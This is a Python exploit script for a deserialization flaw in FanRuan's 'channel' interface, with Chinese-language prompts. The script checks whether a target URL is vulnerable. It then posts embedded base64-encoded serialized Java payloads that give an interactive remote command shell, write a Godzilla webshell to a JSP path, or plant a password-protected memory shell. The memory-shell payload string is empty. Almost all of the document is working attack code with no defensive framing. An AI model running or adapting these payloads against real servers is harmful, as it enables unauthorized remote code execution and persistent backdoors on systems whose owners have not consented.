#!/usr/bin/env python
# -*- conding:utf-8 -*-
# 帆软channel接口反序列化
# Author: SXdysq

import base64
import requests
import sys
import concurrent.futures
import urllib3
urllib3.disable_warnings()

RED = '\x1b[1;91m'
BLUE = '\033[1;94m'
GREEN = '\033[1;32m'
BOLD = '\033[1m'
ENDC = '\033[0m'

headers = {
    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",
    "Content-Type": "application/octet-stream",
    "Connection": "close",
}

cmd_payload = b"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"
shell_payload = b"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";
mem_payload = b"";

targetpath = "/decision/remote/design/channel"
shellpath = "/QTjCOhhp.jsp";
mempath = "/?IGA_63be9acbb82c1e0b=whoami";
meminfo = "\n密码：qax36oNb 密钥：qax36oNb";

def Title():
    print(BOLD + '''
    Title: 帆软channel接口反序列化
    Author: SXdysq
    ''' + ENDC)

def Check(target_url):
    try:
        burp0_url = target_url + targetpath
        req = requests.get(burp0_url, headers=headers, verify=False, timeout=3)
        if "method 'GET' not supported" in req.text:
            req = requests.post(burp0_url, headers=headers, verify=False, timeout=3)
            if "如需访问请联系管理员" not in req.text:
                return burp0_url
            else:
                print(RED + '[-]漏洞不存在\n' + ENDC)
                sys.exit(0)
        else:
           print(RED + '[-]漏洞不存在\n' + ENDC)
           sys.exit(0)
    except Exception as e:
        print(e)
        print(RED + '[-]无法与目标建立连接\n' + ENDC)
        sys.exit(0)


def Cmd(url):
    print(BLUE + "[*]在command后输入执行命令；Linux空格可以尝试使用${IFS}代替, Windows有空格可以尝试使用\"\"包裹；别几把ping了，容易ping死\n" + ENDC)

    while True:
        try:
            command = str(input(BOLD + 'command: ' + ENDC))
            burp0_headers = {"Content-Type": "application/octet-stream", "Testdmc": command, "Testecho": "TestEcho"}
            burp0_data = base64.b64decode(cmd_payload)
            try:
                response = requests.post(url=url, headers=burp0_headers, data=burp0_data, verify=False, timeout=3)
                testdmc_value = response.headers['Testdmc']
                print(base64.b64decode(testdmc_value).decode('utf-8'))
            except Exception as e:
                print(RED + '[-]未知错误\n' + ENDC)
                sys.exit(0)
        except KeyboardInterrupt:
            return

def Shell(target_url):
    print(GREEN + '\n正在写入WebShell......' + ENDC)

    burp0_data = base64.b64decode(shell_payload)
    target_urls = target_url + targetpath
    ShellUrl = target_url + shellpath
    try:
        requests.post(url=target_urls, headers=headers, data=burp0_data, verify=False, timeout=3)
        response = requests.get(url=ShellUrl, headers=headers, data=burp0_data, verify=False, timeout=3)
        if response.status_code == 200 and "this is testing <||>" in response.text:
            print(RED + "\nSuccess!\n" + "哥斯拉默认配置\n" + ShellUrl + ENDC)
        else:
            print(RED + 'False!' + ENDC)

    except Exception as e:
        print(RED + '[-]未知错误\n' + ENDC)
        sys.exit(0)

    while True:
        choice = input(GREEN + '\n请选择（1.继续 2.退出）：' + ENDC)
        if choice == "1":
            return
        elif choice == "2":
            exit()

def Mem(target_url):
    print(GREEN + '\n正在写入内存马......' + ENDC)

    burp0_data = base64.b64decode(mem_payload)
    target_urls = target_url + targetpath
    MemUrl = target_url + mempath
    try:
        requests.post(url=target_urls, headers=headers, data=burp0_data, verify=False, timeout=3)
        response = requests.get(url=MemUrl, headers=headers, data=burp0_data, verify=False, timeout=3)
        if response.status_code == 200 :
            print(RED + "\nSuccess!\n" + "哥斯拉\n" + MemUrl + meminfo + ENDC)
        else:
            print(RED + 'False!' + ENDC)

    except Exception as e:
        print(RED + '[-]未知错误\n' + ENDC)
        sys.exit(0)

    while True:
        choice = input(GREEN + '\n请选择（1.继续 2.退出）：' + ENDC)
        if choice == "1":
            return
        elif choice == "2":
            exit()


if __name__ == '__main__':
    Title()
    target_url = str(input(BOLD + 'Url: ' + ENDC))
    url = Check(target_url)
    while True:
        print(BLUE + '\n1. 交互式命令' + ENDC)
        print(RED + '2. 写入WebShell' + ENDC)
        print(GREEN + '3. 写入内存马' + ENDC)
        print(BOLD + '4. 退出程序' + ENDC)
        choice = input(GREEN + '\n请选择要进入的程序（1、2、3、4）：' + ENDC)
        if choice == "1":
            Cmd(url)
        elif choice == "2":
            Shell(target_url)
        elif choice == "3":
            Mem(target_url)
        elif choice == "4":
            exit()
        else:
            print("无效选择，请重新输入！")
